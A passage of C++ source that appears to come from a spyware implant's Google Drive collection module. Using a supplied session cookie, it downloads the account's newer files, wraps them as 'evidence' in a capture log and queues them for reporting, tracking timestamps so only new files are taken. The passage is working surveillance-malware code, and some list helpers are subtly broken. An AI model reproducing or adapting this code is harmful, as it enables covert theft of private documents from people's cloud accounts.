			if(jValue->IsObject())
			{
				jObj = jValue->AsObject();
			
				//get the download url
				if((jObj[L"downloadUrl"]->IsString()) && (jObj[L"downloadUrl"]->AsString().c_str() != NULL))
				{
					pwszFrom = (LPWSTR)jObj[L"downloadUrl"]->AsString().c_str();
					if(!_wcsnicmp(pwszFrom, L"https://", 8))
						pwszFrom += 8;									
				
					pwszTo = StrStr(pwszFrom, L"/");
					if(pwszTo != NULL)
					{
						dwSize = (pwszTo - pwszFrom);

						//get the host name
						wcsncpy_s(pwszHost, 256, pwszFrom, dwSize);					
						wcscpy_s(pwszURI, 1024, pwszTo);
					
						//swprintf_s(pwszHeader, 1024, L"Host: %s\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", pwszHost);
						swprintf_s(pwszHeader, 1024, L"Host: %s\r\nConnection: keep-alive\r\nAccept: */*", pwszHost);

						//get file
						dwBufferSize = 0;

						dwRet = HttpSocialRequest(pwszHost,
													L"GET",
													pwszURI,
													pwszHeader,
													443, 
													NULL, 
													0, 
													(LPBYTE *)&pszRecvBuf,
													&dwBufferSize, 
													pszCookie);
						znfree(&pwszURI);
						znfree(&pwszHost);
						znfree(&pwszHeader);

						if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize != pFile->dwFileSize))
						{
							delete jValue;
							znfree(&pszRecvBuf);
							return GD_E_HTTP;
						}
					}
				}
			}
		}
		else
		{
			znfree(&pwszURI);
			znfree(&pwszHost);
			znfree(&pwszHeader);
			return GD_E_INVALID_JSON_DATA;
		}

		//delete json struct
		delete jValue;
	}

	znfree(&pwszURI);
	znfree(&pwszHost);
	znfree(&pwszHeader);

	//save the pointer to the file buffer
	pFile->pcFileBuf  = (LPBYTE)pszRecvBuf;
	pFile->dwFileSize = dwBufferSize;

	return GD_E_SUCCESS;	
}


//get all the files newer than 'dwTimestamp', according to the file type and to the timestamp
//DWORD GD_DownloadFiles(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPWSTR *pwszFileType, LPSTR pszCookie)
DWORD GD_DownloadFiles(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCookie)
{
	PGD_FILE pItem=NULL, pList=NULL;
	DWORD i=0, j=0;
	int	  nPos=0;
	
	//get only the last n items
	if(pFileList->Items > GD_MAX_ITEMS)
		pList = GD_ScrollList(pFileList->List, (pFileList->Items-GD_MAX_ITEMS-1));
	else
		pList = pFileList->List;
		
	//loop the linked list
	for(pItem=pList; pItem != NULL; pItem=pItem->Next)
	{
		//download the file
		DWORD dwRetFile = GD_GetFile(pItem, pParams, pszCookie);
		if(dwRetFile == GD_E_SUCCESS)
		{
			//log the file buffer (info only)
			//dwRet = GD_LogEvidence(pItem);

			//copy the encrypted file to the log structure
			DWORD dwRet = LogCloud_CopyFile(pItem, PM_FILEAGENT_CAPTURE);
			znfree(&pItem->pcFileBuf);

			if(dwRet != LC_E_SUCCESS)
				return dwRet;				
		}

		if((dwRetFile == GD_E_SUCCESS) || (dwRetFile == GD_E_FILESIZE))
		{
			if(GD_IsGoogleDoc(pItem->FileType))
			{
				//set the timestamp for document
				GD_SetLastTimeStamp("DC", pItem->dwTimestamp, pParams->pszDriveID);
			}
			else
			{
				//set the timestamp for file
				GD_SetLastTimeStamp("FL", pItem->dwTimestamp, pParams->pszDriveID);
			}
		}
		else
			return dwRetFile;
	}

	return GD_E_SUCCESS;
}




//return the file type parsing the json file array
GD_ITEM_TYPE GD_GetFileType(JSONArray jFile)
{
	//the file type is in the position 3 of the array
	if(!jFile[GD_FILE_TYPE]->IsString())
		return GD_ITEM_UNKNOWN;

	//verify if it's a directory
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.folder") != NULL)
		return GD_ITEM_DIR;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.spreadsheet") != NULL)
		return GD_ITEM_XLS;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.ritz") != NULL)
		return GD_ITEM_XLS;	

	//verify if it's a google presentation (ppt)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.presentation") != NULL)
		return GD_ITEM_PPT;	

	//verify if it's a google presentation (ppt)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.punch") != NULL)
		return GD_ITEM_PPT;

	//verify if it's a google drawing (jpg)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.drawing") != NULL)
		return GD_ITEM_JPG;	

	//verify if it's a google document (docx)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.document") != NULL)
		return GD_ITEM_DOC;	

	//verify if it's a google document (docx)
	if(StrStrI(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.kix") != NULL)
		return GD_ITEM_DOC;	

	//check the file size
	if(!jFile[GD_FILE_SIZE]->IsNumber())
		return GD_ITEM_UNKNOWN;

	if(jFile[GD_FILE_SIZE]->AsNumber() == 0)
		return GD_ITEM_UNKNOWN;

	return GD_ITEM_FILE;
}


//verify if the size of the file is valid and return the size in bytes
DWORD GD_GetFileSize(JSONArray jFile, GD_ITEM_TYPE FileType)
{
	double dSize = 0;

	//get file size (continue if the file size is not a number of if the size is 0)
	if(!jFile[GD_FILE_SIZE]->IsNumber())
		return 0;

	//if the file size is not a number
	dSize = jFile[GD_FILE_SIZE]->AsNumber();
	if((dSize == 0) && (FileType == GD_ITEM_FILE))
		return 0;

	if(dSize > GD_MAX_FILE_SIZE)
		return 0;

	//if the file is 0, it's a google document, so set the size = 1
	if(GD_IsGoogleDoc(FileType))
		dSize = 1;

	return ((DWORD)dSize);
}


BOOL GD_IsGoogleDoc(GD_ITEM_TYPE FileType)
{
	if((FileType == GD_ITEM_DOC) ||
	   (FileType == GD_ITEM_XLS) ||
	   (FileType == GD_ITEM_PPT) || 
	   (FileType == GD_ITEM_JPG))
	   return TRUE;

	return FALSE;
}


//add a file extension to the google document, according to the specified file type
BOOL GD_AddFileExtension(LPWSTR *pwszFileName, GD_ITEM_TYPE FileType)
{	
	//if it's a document, realloc the string to append the extension bytes
	if(!GD_IsGoogleDoc(FileType))
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] The file is not a google document (GD_AddFileExtensions(0))");
		//#endif

		return GD_E_GENERIC;
	}

	if(pwszFileName == NULL)
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] FileName is NULL (GD_AddFileExtensions(1))");
		//#endif

		return GD_E_GENERIC;
	}

	LPWSTR pwszNewName = NULL;
	DWORD  dwSize = 0;
		
	//alloc mem for the new string
	dwSize = wcslen(*pwszFileName) + 6; //add 5 bytes for the extension and 1 for \0

	pwszNewName = (LPWSTR)zalloc(dwSize * sizeof(WCHAR));
	if(pwszNewName == NULL)
	{
		//#ifdef _DEBUG
		//	OutputDebugString(L"[!] Memory allocation failed (GD_AddFileExtensions(pwszNewName))");
		//#endif
		return GD_E_ALLOC;
	}

	switch(FileType)
	{
		case GD_ITEM_DOC:
			swprintf_s(pwszNewName, dwSize, L"%s.%s", *pwszFileName, L"docx");
			break;
		case GD_ITEM_XLS:
			swprintf_s(pwszNewName, dwSize, L"%s.%s", *pwszFileName, L"xlsx");
			break;
		case GD_ITEM_PPT:
			swprintf_s(pwszNewName, dwSize, L"%s.%s", *pwszFileName, L"pptx");
			break;
		case GD_ITEM_JPG:
			swprintf_s(pwszNewName, dwSize, L"%s.%s", *pwszFileName, L"jpg");
			break;
	}

	//delete the old file name
	znfree(pwszFileName);

	//assign the new name to the file name
	*pwszFileName = pwszNewName;

	return GD_E_SUCCESS;
}


BOOL GD_LogEvidence(PGD_FILE pFile)
{	
	LPSTR pszProcName	= "GOOGLE_DRIVE";
	DWORD dwDelimiter	= ELEM_DELIMITER;
	DWORD dwSize, dwFileSizeHi, dwFileSizeLo, dwOperation;
	LPBYTE lpcBuf, lpTmp;
	struct tm time;
	_int64 nTime;
	BOOL   bRet = FALSE;
	//char   szBuf[32];

	//verify the log info
	if((pFile == NULL)				 || 
	   (pFile->pwszFileName == NULL) || 
	   (pFile->pwszFileID   == NULL))
		return FALSE;

	//build the log	

	//get the system time
	_time64(&nTime);

	//sprintf_s(szBuf, sizeof(szBuf), "%d" , pFile->dwTimestamp);
	//szBuf[10] = 0;
	//nTime = atol(szBuf);

	//convert time value to a tm struct
	_gmtime64_s(&time, &nTime);
	time.tm_year += 1900;
	time.tm_mon++;

	//compute the size of the log
	dwSize  = sizeof(time);											//timestamp
	dwSize += (strlen(pszProcName) + 1);							//procname (googledrive)
	dwSize += sizeof(dwFileSizeHi);									//filesize (hi dword)
	dwSize += sizeof(dwFileSizeLo);									//filesize (low dword)
	dwSize += sizeof(dwOperation);									//operation
	dwSize += ((wcslen(pFile->pwszFileName) + 1) * sizeof(WCHAR));	//filename
	dwSize += sizeof(dwDelimiter);									//delimiter

	//alloc mem for the log data
	lpcBuf = (LPBYTE)malloc(dwSize);
	if(lpcBuf == NULL)
		return FALSE;
	lpTmp = lpcBuf;

	dwFileSizeHi = 0;
	dwFileSizeLo = pFile->dwFileSize;
	dwOperation  = GENERIC_READ;

	//fill the buffer
	memcpy(lpTmp, &time, sizeof(time));															//timestamp
	lpTmp += sizeof(time);
	memcpy(lpTmp, pszProcName, (strlen(pszProcName) + 1));										//procname
	lpTmp += (strlen(pszProcName) + 1);
	memcpy(lpTmp, &dwFileSizeHi, sizeof(dwFileSizeHi));											//filesize hi
	lpTmp += sizeof(dwFileSizeHi);
	memcpy(lpTmp, &dwFileSizeLo, sizeof(dwFileSizeLo));											//filesize lo
	lpTmp += sizeof(dwFileSizeLo);
	memcpy(lpTmp, &dwOperation, sizeof(dwOperation));											//operation
	lpTmp += sizeof(dwOperation);
	memcpy(lpTmp, pFile->pwszFileName, ((wcslen(pFile->pwszFileName) + 1) * sizeof(WCHAR)));	//filename
	lpTmp += ((wcslen(pFile->pwszFileName) + 1) * sizeof(WCHAR));
	memcpy(lpTmp, &dwDelimiter, sizeof(dwDelimiter));

	//queue the log 
	bRet = LogCloud_ReportLog(PM_FILEAGENT, lpcBuf, dwSize);

	return bRet;
}


//insert the file struct to the list ordered by timestamp (ascending order)
DWORD GD_AddFileToList(PGD_FILE *pList, PGD_FILE pNewFile)
{
	PGD_FILE pItem=NULL, pTmp=NULL, pLast=NULL;
	
	for(pItem=*pList; pItem!=NULL; pItem=pItem->Next)
	{
		//check the timestamp
		if(pItem->dwTimestamp == 0)
			break;

		if(pItem->dwTimestamp > pNewFile->dwTimestamp)
			break;		

		pLast = pItem;
	}

	pTmp = pItem;

	if(pLast == NULL)
	{
		//add element to first position
		pLast = pNewFile;
		*pList = pLast;
	}
	else
		pLast->Next = pNewFile;

	pNewFile->Next = pTmp;

	return GD_E_SUCCESS;
}

//count the item in the linked list
DWORD GD_CountListItems(PGD_FILE pFileList)
{
	PGD_FILE pItem=NULL, pNext=NULL;
	int i;
	
	//scroll the list till the end
	for(i=0, pItem=pFileList; pItem!=NULL; pItem=pNext, i++)
		;

	return i;
}

//go to the n element of the linked list
PGD_FILE GD_ScrollList(PGD_FILE pFileList, DWORD dwPos)
{
	PGD_FILE pItem=NULL, pNext=NULL;
	DWORD i;
	
	for(i=0, pItem=pFileList; (i<dwPos) && (pItem!=NULL); pItem=pNext, i++)
	{
		pNext = pItem->Next;
	}

	return pNext;
}


//delete all the elements from the list
void GD_DeleteFile(PGD_FILE pFile)
{
	if(pFile == NULL)
		return;

	//delete the struct's strings
	znfree(&pFile->pwszFileID);
	znfree(&pFile->pwszFileName);
	znfree(&pFile->pcFileBuf);
	
	//delete the current item
	znfree((LPVOID*)&pFile);
}

//delete all the elements from the list
void GD_DeleteFileList(PGD_FILE *pFileList)
{
	PGD_FILE pItem=NULL, pNext=NULL;
	
	for(pItem=*pFileList; pItem!=NULL; pItem=pNext)
	{		
		//delete the struct's strings
		znfree(&pItem->pwszFileID);
		znfree(&pItem->pwszFileName);
		znfree(&pItem->pcFileBuf);
	
		//save the next item in the list
		pNext = pItem->Next;

		//delete the current item
		znfree((LPVOID*)&pItem);
	}

	*pFileList = NULL;
}



//get the last timestamp used for the requested evidence type
DWORD GD_GetLastTimeStamp(LPSTR lpszPrefix, DWORD *dwTimestamp, LPSTR pstrSuffix)
{
	char	szTSName[64] = {0};
	char	*pEnc = NULL;

	if(lpszPrefix != NULL)
		strcpy_s(szTSName, sizeof(szTSName), lpszPrefix);

	//encode the suffix
	pEnc = base64_encode((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
	if(pEnc == NULL)
		return GD_E_ALLOC;

	//add the suffix
	if(pstrSuffix)
		strcat_s(szTSName, sizeof(szTSName), pEnc);

	//free heap
	znfree((LPVOID*)&pEnc);

	//get last timestamp saved
	*dwTimestamp = SocialGetLastTimestamp(szTSName, NULL);

	return GD_E_SUCCESS;
}


//set the last timestamp used for the requested evidence type
DWORD GD_SetLastTimeStamp(LPSTR lpszPrefix, DWORD dwTimestamp, LPSTR pstrSuffix)
{
	char	szTSName[64];
	char	*pEnc = NULL;

	if(lpszPrefix != NULL)
		strcpy_s(szTSName, sizeof(szTSName), lpszPrefix);

	//encode the suffix
	pEnc = base64_encode((const unsigned char*)pstrSuffix, strlen(pstrSuffix));
	if(pEnc == NULL)
		return GD_E_ALLOC;

	//add a suffix
	strcat_s(szTSName, sizeof(szTSName), pEnc);
	
	znfree((LPVOID*)&pEnc);

	//set the timestamp	
	SocialSetLastTimestamp(szTSName, dwTimestamp, 0);

	return GD_E_SUCCESS;
}


#ifdef _DEBUG

//print the linked list
void GD_PrintList(PGD_FILE pFileList)
{
	WCHAR wszTimestamp[256];
	PGD_FILE pItem = NULL;
	
	for(pItem=pFileList; pItem!=NULL; pItem=pItem->Next)
	{
		swprintf_s(wszTimestamp, sizeof(wszTimestamp)/2, L"%lu", pItem->dwTimestamp);
		OutputDebugString(wszTimestamp);
		OutputDebugString(L" - ");
		OutputDebugString(pItem->pwszFileName);
		OutputDebugString(L"\r\n");		
	}
}

//writes data on disk
void GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize)
{
	HANDLE hFile;
	DWORD dwWritten=0;

	//file creation
	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return;

	//write to file
	if(!WriteFile(hFile, lpBuffer, dwSize, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}

	CloseHandle(hFile);
}

//writes data on disk
void GD_DumpBuffer(LPCWSTR lpFileName, WCHAR* lpBuffer, DWORD dwSize)
{
	HANDLE hFile;
	DWORD dwWritten=0;

	//file creation
	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return;

	//write to file
	if(!WriteFile(hFile, lpBuffer, dwSize, &dwWritten, NULL))
	{
		CloseHandle(hFile);
		return;
	}

	CloseHandle(hFile);
}

#endif